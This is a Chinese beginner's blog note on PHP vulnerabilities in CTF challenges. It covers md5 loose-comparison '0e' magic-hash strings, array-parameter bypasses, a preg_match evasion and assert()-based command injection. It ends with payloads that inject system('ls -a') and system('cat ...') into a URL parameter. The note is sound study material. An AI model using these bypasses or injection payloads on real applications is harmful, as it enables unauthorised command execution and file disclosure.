---
title: php2
date: 2024-08-12
categories:
  - 学习笔记
tags:
  - 初学者
  - 日记
---





##      php代码

#### **1.hash加密相关：**

PHP弱类型hash比较典型代码：

```
if(md5($a) == md5($b)) {    //注意两个等号“==”
    echo $flag;
}
```

漏洞的原理如下：

```
== 在进行比较的时候，会先将两边的变量类型转化成相同的，再进行比较。
0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。
```

以下是一些md5加密后开头为0e的字符串：

```
QNKCDZO
0e830400451993494058024219903391

s878926199a
0e545993274517709034328855841020
  
s155964671a
0e342768416822451524974117254469
  
s214587387a
0e848240448830537924465865611904
  
s214587387a
0e848240448830537924465865611904
  
s878926199a
0e545993274517709034328855841020
  
s1091221200a
0e940624217856561557816327384675
  
s1885207154a
0e509367213418206700842008763514

aabg7XSs
```

另外，这个也可以用数组绕过，这个方法在下面会详细说。

#### **2.数组返回NULL绕过**

```
if(md5($a) === md5($b)) {       //两个等号变成三个，三个===不会进行类型转换
    echo $flag;
}
```

那么利用弱类型hash比较缺陷将无法绕过，这时可以使用数组绕过。

传入`?a[]=1&b[]=2`就可以成功绕过判断。

#### **3.正则表达式相关**

```
<?php
    $p = $_GET['p'];
    if (preg_match('/[0-9a-zA-Z]{2}/',$p) === 1) {
        echo 'False';
    } else {
        $pp = trim(base64_decode($p));
        if ($pp === 'flag.php') {
            echo 'success';
        }
    }
?>
```

单引号绕过preg_match()正则匹配：

在每一个字符前加上单引号可以绕过preg_match的匹配

Bugku ereg正则%00截断：[Bugku web — ereg正则%00截断(代码审计) ——详细题解_%00截断正则匹配-CSDN博客](https://blog.csdn.net/weixin_44953600/article/details/108855995)

#### **4.命令执行漏洞**：

assert()函数引起的命令执行:assert函数的参数为字符串时，会将字符串当做PHP命令来执行

例如：assert(‘phpinfo()’)相当于执行<?php phpinfo() ?>

```
<?php
error_reporting(0);
if (isset($_GET['file'])) {
    if($_GET['file'] === "flag"){
        highlight_file("flag.php");
    }else{
        $page = $_GET['file'];
    }
} else {
    $page = "./flag.php";
}

assert("file_exists('$page')");
?>
```

payload：

 `?file=123’) or system(‘ls -a’);#`
`?file=123’) or system(‘cat .ffll44gg’);#`
